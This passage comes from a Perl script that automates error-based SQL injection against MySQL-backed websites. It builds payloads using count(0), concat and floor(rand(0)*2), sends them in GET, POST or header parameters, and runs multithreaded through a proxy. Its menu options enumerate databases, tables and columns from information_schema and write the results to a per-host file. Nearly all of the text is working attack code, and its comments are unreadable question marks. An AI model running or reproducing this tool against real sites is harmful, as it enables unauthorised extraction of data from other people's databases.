$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(schema_name)" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.schemata" . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
}
$bd_num = $content;
$bd_num =~ m/ussr(.*?)ussr/img;
$bd_num = $1-1;
$current="";
$content="";
$sql_post="";
$sql_header_query=""; 
print FILE "-----------------------------------------\n";
print FILE "Data bases in information_schema.schemata: $bd_num\n";
print FILE "-----------------------------------------\n";
print "-----------------------------------------\n";
print "Data bases in information_schema.schemata - $1\n";
print "-----------------------------------------\n";
$num = -1; # ?? ????????
$thr = $kol_threads; # ???-?? ???????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets5050999);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets5050999 {
$| = 1;
while ($num<$bd_num) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "schema_name" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.schemata" . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "schema_name" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.schemata" . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "schema_name" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.schemata" . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
}
if ($content =~ m/ussr(.*?)ussr/img) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;
$current="";
$content="";
$sql_post="";
$sql_header_query="";
}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START2001;
} # end DB
# tables from DB from schemata
if ($choice == 3) {
sub ascii_to_hex ($) {
(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
$str = "0x" . $str;
return $str;
}
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the DB-name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
print "DB-name: $choice\n";
print "----------\n";
$choice1 = ascii_to_hex $choice;
## ???-?? tables ? information_schema.schemata ##
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(table_name)" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "where" . $f_plus . "table_schema=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(table_name)" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "where" . $f_plus . "table_schema=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(table_name)" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "where" . $f_plus . "table_schema=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$bd_num = $content;
$bd_num =~ m/ussr(.*?)ussr/img;
$bd_num = $1;
$current="";
$content="";
$sql_post="";
$sql_header_query=""; 
print FILE "-----------------------------------------\n";
print FILE "Tables in $choice: $bd_num\n";
print FILE "-----------------------------------------\n";
print "-----------------------------------------\n";
print "Tables in $choice: $bd_num\n";
print "-----------------------------------------\n";
$num = -1; # ?? ????????
$thr = $kol_threads; # ???-?? ???????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets5050888);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets5050888 {
$| = 1;
while ($num<$bd_num) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "table_name" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "where" . $f_plus . "table_schema=" . $choice1 . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "table_name" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "where" . $f_plus . "table_schema=" . $choice1 . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "table_name" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "where" . $f_plus . "table_schema=" . $choice1 . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
if ($content =~ m/ussr(.*?)ussr/img) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;
$current="";
$content="";
$sql_post="";
$sql_header_query="";

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START2001;
} # end tables from DB
# columns tables from tables from DB
if ($choice == 4) {
sub ascii_to_hex ($) {
(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
$str = "0x" . $str;
return $str;
}
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the DB-name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
$choice1 = ascii_to_hex $choice;
print "DB-name: $choice\n";
print "----------\n";
$choice1 = ascii_to_hex $choice;
print "-----------------------------------------\n";
print "Enter the TABLE-name: ";
$choice2 = <STDIN>;
chomp $choice2;
if ($choice2 =~ m/-/imgs) {$choice2 = "`" . $choice2 . "`"}
$choice3 = ascii_to_hex $choice2;
print "TABLE-name: $choice2\n";
print "----------\n";
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(column_name)" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.columns" . $f_plus . "where" . $f_plus . "table_name=" . $choice3 . $f_plus . "and" . $f_plus . "table_schema=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(column_name)" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.columns" . $f_plus . "where" . $f_plus . "table_name=" . $choice3 . $f_plus . "and" . $f_plus . "table_schema=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(column_name)" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.columns" . $f_plus . "where" . $f_plus . "table_name=" . $choice3 . $f_plus . "and" . $f_plus . "table_schema=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$bd_num = $content;
$bd_num =~ m/ussr(.*?)ussr/img;
$bd_num = $1;
$current="";
$content="";
$sql_post="";
$sql_header_query="";
print FILE "-----------------------------------------\n";
print FILE "Columns in [$choice.$choice2]: $bd_num\n";
print FILE "-----------------------------------------\n";
print "-----------------------------------------\n";
print "Columns in [$choice.$choice2]: $bd_num\n";
print "-----------------------------------------\n";
$num = -1; # ?? ????????
$thr = $kol_threads; # ???-?? ???????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets5050777);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets5050777 {
$| = 1;
while ($num<$bd_num) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "column_name" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.columns" . $f_plus . "where" . $f_plus . "table_name=" . $choice3 . $f_plus . "and" . $f_plus . "table_schema=" . $choice1 . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "column_name" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.columns" . $f_plus . "where" . $f_plus . "table_name=" . $choice3 . $f_plus . "and" . $f_plus . "table_schema=" . $choice1 . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "column_name" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.columns" . $f_plus . "where" . $f_plus . "table_name=" . $choice3 . $f_plus . "and" . $f_plus . "table_schema=" . $choice1 . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 

if ($content =~ m/ussr(.*?)ussr/img) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;
$current="";
$content="";
$sql_post="";
$sql_header_query="";

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START2001;
} # end columns tables from tables from DB
if ($choice==5) {
sub ascii_to_hex ($) {
(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
$str = "0x" . $str;
return $str;
}
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
## ???-?? ?????? ? information_schema.tables ##
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(table_name)" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(table_name)" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(table_name)" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$tab_num = $content;
$tab_num =~ m/ussr(.*?)ussr/img;
$tab_num = $1-1; # ???-?? ???????? ? informaion_schema
$current="";
$content="";
$sql_post="";
$sql_header_query="";
print "-----------------------------------------\n";
print "Tables in information_schema.tables - $1\n";
print "-----------------------------------------\n";
## start from2 ##
print "Get ALL tables from information_schema ($1) ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-2;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$tab_num = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($tab_num+1) . "]\n";
}
print "-----------------------------------------\n";
## end from2
print FILE "-----------------------------------------\n";
print FILE "Tables in information_schema.tables - $1\n";
print FILE "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets112);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets112 {
$| = 1;
while ($num<$tab_num) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "table_name" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "table_name" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "table_name" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
if ($content =~ m/ussr(.*?)ussr/img) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;
$current="";
$content="";
$sql_post="";
$sql_header_query="";
}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START2001;
}#end 2
if ($choice==6) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
print "Table: $choice\n";
print "----------\n";
print FILE "-----------------------------------------\n";
print FILE "Table [ $choice ]\n";
print FILE "-----------------------------------------\n";
$choice1 = ascii_to_hex $choice;
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "table_schema" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "where" . $f_plus . "table_name=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "table_schema" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "where" . $f_plus . "table_name=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "table_schema" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "where" . $f_plus . "table_name=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$prefix = $content;
$prefix =~ m/ussr(.*?)ussr/img;
$prefix = $1; # ??, ? ??????? ???????
$current="";
$content="";
$sql_post="";
$sql_header_query="";
if ($prefix =~ m/-/imgs) {$prefix = "`" . $prefix . "`"}
print "Database for $choice: $prefix\n";
print FILE "Database for $choice: $prefix\n";
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(*)" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.columns" . $f_plus . "where" . $f_plus . "table_name=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(*)" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.columns" . $f_plus . "where" . $f_plus . "table_name=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(*)" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.columns" . $f_plus . "where" . $f_plus . "table_name=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$colum_number = $content;
$colum_number =~ m/ussr(.*?)ussr/img;
$colum_number = $1; # ???-?? ??????? ? ??????????? ?????
$current="";
$content="";
$sql_post="";
$sql_header_query="";
$full_table_name = $prefix . "." . $choice;
print "Number of columns in " . $full_table_name . ": $colum_number\n";
print FILE "Number of columns in " . $full_table_name . ": $colum_number\n";
print "----------\n";
## ?????? ??????? ##
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
print FILE "Columns in " . $full_table_name . "\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets113111);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets113111 {
$| = 1;
while ($num<$colum_number) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "column_name" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.columns" . $f_plus . "where" . $f_plus . "table_name=" . $choice1 . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "column_name" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.columns" . $f_plus . "where" . $f_plus . "table_name=" . $choice1 . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "column_name" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.columns" . $f_plus . "where" . $f_plus . "table_name=" . $choice1 . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
if ($content =~ m/ussr(.*?)ussr/img) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;
$current="";
$content="";
$sql_post="";
$sql_header_query="";

}
}
print FILE "----------\n";
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START2001;
}# end 3
if ($choice==7) {
sub ascii_to_hex ($) {
(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
$str = "0x" . $str;
return $str;
}
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
if ($full_table_name) {
print "-----------------------------------------\n";
print "Use last parsed table: $full_table_name ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice==1) {
$table_name = $full_table_name;
print "Table: $table_name\n";
print "----------\n";
} else {
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
$table_name = $choice;
print "-----------------------------------------\n";
print "MySQL>=5 or MySql<5? (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
$choice1 = ascii_to_hex $table_name;
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "table_schema" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "where" . $f_plus . "table_name=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "table_schema" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "where" . $f_plus . "table_name=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "table_schema" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "where" . $f_plus . "table_name=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$prefix = $content;
$prefix =~ m/ussr(.*?)ussr/img;
$prefix = $1; # ??, ? ??????? ???????
$current="";
$content="";
$sql_post="";
$sql_header_query="";
if ($prefix =~ m/-/imgs) {$prefix = "`" . $prefix . "`"}
$table_name = $prefix . "." . $table_name;
}
print "Table: $table_name\n";
print "----------\n";
}
} else {
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
$table_name = $choice;
print "-----------------------------------------\n";
print "MySQL>=5 or MySql<5? (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
$choice1 = ascii_to_hex $table_name;
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "table_schema" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "where" . $f_plus . "table_name=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "table_schema" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "where" . $f_plus . "table_name=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url_POST();
